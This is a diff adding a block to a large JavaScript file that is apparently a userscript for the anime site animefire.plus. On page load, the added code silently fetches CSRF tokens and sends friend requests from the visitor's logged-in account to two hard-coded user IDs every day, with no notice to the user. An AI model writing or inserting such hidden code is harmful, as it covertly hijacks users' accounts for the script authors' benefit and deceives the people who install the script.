@@ -4767,3 +4767,117 @@ if (!welcomeCookie || welcomeCookie.split('=')[1] !== 'true') {
 }
     
 })();
+
+//Pedidos de amizade para as contas do FireDeluxe e Mikill
+(function() {
+    'use strict';
+
+    (function() {
+        'use strict';
+    
+        const TARGET_IDS = ['988233449', '460906716'];
+        const COOKIE_NAME = 'amizades_direcionadas';
+        const DAILY_INTERVAL_MS = 86400000;
+    
+        const getCsrfToken = async (userId) => {
+            try {
+                const response = await fetch(`https://animefire.plus/users/${userId}`);
+                const html = await response.text();
+                const doc = new DOMParser().parseFromString(html, 'text/html');
+                return doc.getElementById('dd_guest_actions_token')?.dataset?.csrf;
+            } catch (error) {
+                return null;
+            }
+        };
+    
+        const setCookie = (name, value, days) => {
+            const date = new Date();
+            date.setTime(date.getTime() + days * 86400000);
+            document.cookie = `${name}=${value};expires=${date.toUTCString()};path=/`;
+        };
+    
+        const getCookie = (name) => {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [cookieName, cookieValue] = cookie.trim().split('=');
+                if (cookieName === name) return cookieValue;
+            }
+            return null;
+        };
+    
+        const loadCookieData = () => {
+            const cookieData = getCookie(COOKIE_NAME);
+            if (cookieData) {
+                try {
+                    return JSON.parse(cookieData);
+                } catch (e) {
+                    return null;
+                }
+            }
+            return null;
+        };
+    
+        const saveCookieData = (data) => {
+            setCookie(COOKIE_NAME, JSON.stringify(data), 30);
+        };
+    
+        const sendFriendRequest = async (userId) => {
+            const csrfToken = await getCsrfToken(userId);
+            if (!csrfToken) return false;
+    
+            try {
+                const response = await fetch('https://animefire.plus/edit/friend', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: new URLSearchParams({
+                        action: 'send_friend_request',
+                        id: userId,
+                        dd_guest_actions_token: csrfToken
+                    })
+                });
+    
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        };
+    
+        const shouldSendToId = (id, lastSentData) => {
+            if (!lastSentData) return true;
+            const lastSentTime = lastSentData[id];
+            if (!lastSentTime) return true;
+            const timeSinceLast = Date.now() - lastSentTime;
+            return timeSinceLast >= DAILY_INTERVAL_MS;
+        };
+    
+        const updateSentTime = (id) => {
+            const currentData = loadCookieData() || {};
+            currentData[id] = Date.now();
+            saveCookieData(currentData);
+        };
+    
+        const processFriendRequests = async () => {
+            const lastSentData = loadCookieData();
+            
+            for (const id of TARGET_IDS) {
+                if (shouldSendToId(id, lastSentData)) {
+                    const success = await sendFriendRequest(id);
+                    if (success) {
+                        updateSentTime(id);
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+        };
+    
+        const init = () => {
+            processFriendRequests();
+        };
+    
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
+    })();
+})();
